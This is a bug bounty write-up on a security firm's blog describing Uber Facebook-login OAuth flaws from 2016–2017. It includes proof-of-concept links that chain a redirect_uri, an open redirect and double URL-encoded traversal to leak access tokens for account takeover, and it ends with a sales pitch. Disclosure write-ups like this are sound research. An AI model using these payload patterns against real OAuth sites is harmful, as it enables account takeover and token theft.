---
layout: page
title: "Uber - Navigating the Complexities of redirect_uri: A Bug Bounty Journey"
date: 2024-06-14 11:21:29
description: At Nova Security, we continuously analyze and assess the cybersecurity landscapes of diverse industries, aiming to uncover potential vulnerabilities and provide strategic solutions.
thumbnail: "../../assets/images/blogs/blog_image_2.webp"
author: Ron Chan
tags: ['Uber', 'Bug Bounty', 'Cybersecurity']
categories: [Software, Innovation]
bodyClass: blog-single
---

### - Introduction
In my bug hunting endeavors, I rely on manual techniques rather than automation tools like sqlmap, sublist3r, or jsparser. My setup includes a Burp Pro license on my MacBook Pro and a VPS server for occasional brute-forcing of endpoints to create proof of concepts. This is why I don't often share tools or methodologies—because I don't use them. Instead, my hobby involves scrutinizing 15,000 requests daily through Burp, focusing on sites like uber.com, uberinternal.com, and yahoo.com. I don't chase after reflective or stored XSS unless they're obvious. I test where the site leads me, especially examining variations of redirect_uri in OAuth implementations. My findings are often irregular and spontaneous, which may answer some of the questions I receive from various channels.

### - A Lesser-Known Facebook redirect_uri Trick
Today, I'm sharing a lesser-known Facebook redirect_uri trick I discovered. Back in 2016, Uber allowed Facebook login on both login.uber.com and auth.uber.com. The login flow looked like this:

- `https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2fauth.uber.com%2flogin%3fnext_url=https%3A%2F%2Frush.uber.com%2Flogin%2F&state=m7QWxxPRNII4VGsCSog0xLJ2KF7e8ynpC2c_OAKkQQk%3D`
- `https://auth.uber.com/login?next_url=https%3A%2F%2Frush.uber.com%2Flogin%2F&state=m7QWxxPRNII4VGsCSog0xLJ2KF7e8ynpC2c_OAKkQQk%3D#access_token=xxxx`
- `https://rush.uber.com/login?&#access_token=xxxx`


At first glance, the issue is not immediately obvious, but upon closer inspection, the login endpoint allows further redirection to *.uber.com. Due to browser security, a 302 location header redirect preserves anything after the hash in the URL. This means that if you find an open redirect in the next_url parameter and redirect the user to *.uber.com and then to an attacker-controlled site, you can steal the access token in the URL.

### - The Hidden Danger in Open Redirects
Although Uber no longer accepts open redirect submissions, finding one isn't difficult. One open redirect that still works today is https://login.uber.com/logout, which redirects based on the Referer header.

`https://login.uber.com/logout`

### - Exploiting Redirects for Account Takeover
Using this information, you can figure out an exploit to achieve Facebook account takeover (ATO) in Uber. Here's my exploit:

Here is my exploit.

`<a href="https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2fauth.uber.com%2flogin%3fnext_url=https%3A%2F%2Flogin.uber.com%2Flogout%2F&state=state">Click to leak</a>alert(location.hash)`

### - Revisiting Uber's OAuth Security in 2017
This was reported in late 2016 and promptly fixed. By early 2017, I discovered that Uber's Facebook login still hosted two whitelisted redirect_uris: https://auth.uber.com/login and https://login.uber.com/login. Although they patched the open redirect bug, I found another way to exploit it.

Facebook's redirect_uri accepts double URL-encoded slashes. For example:
`redirect_uri=https%3a%2f%2fwww.example.com%2fdirectory%252f..%252f..%252fescaped` -> PASSED!

Upon decoding in the 302 response, the Location header becomes: `https://www.example.com/directory%2f..%2f..%2fescaped`

Uber's server accepted this and normalized the directory on the server side. Thus, combining Uber's server-side normalization behavior and Facebook's acceptance of double URL-encoded slashes, I found another way to take over Uber's Facebook account.

### - Combining Server Normalization with Redirects
Hence, combining Uber’s server side normalisation behaviour and Facebook’s acceptance of double url encoded slash, we have another way to takeover Uber’s FB account.

`<a href="https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2flogin.uber.com%2flogin%252f..%252f..%252flogout&state=state">Click to leak</a>alert(location.hash)`

This was eventually fixed by removing login.uber.com as a whitelisted redirect_uri.

## - Conclusion: Enhancing Your OAuth Security with Nova Security
OAuth security can be incredibly complex, as illustrated by the intricate vulnerabilities and exploits found in Uber's implementation. Ensuring your OAuth application is secure requires a thorough understanding of potential pitfalls and a keen eye for detail. This is where Nova Security comes in.
At Nova Security, we specialize in identifying and mitigating security risks in OAuth implementations. Our team of experts can meticulously examine your website to uncover vulnerabilities that might otherwise go unnoticed. By leveraging our expertise, you can safeguard your application against unauthorized access, data breaches, and other security threats.

Don't leave your OAuth security to chance. Contact Nova Security today to fortify your application's defenses and ensure peace of mind. Reach out to us through our website or give us a call to schedule a comprehensive security assessment.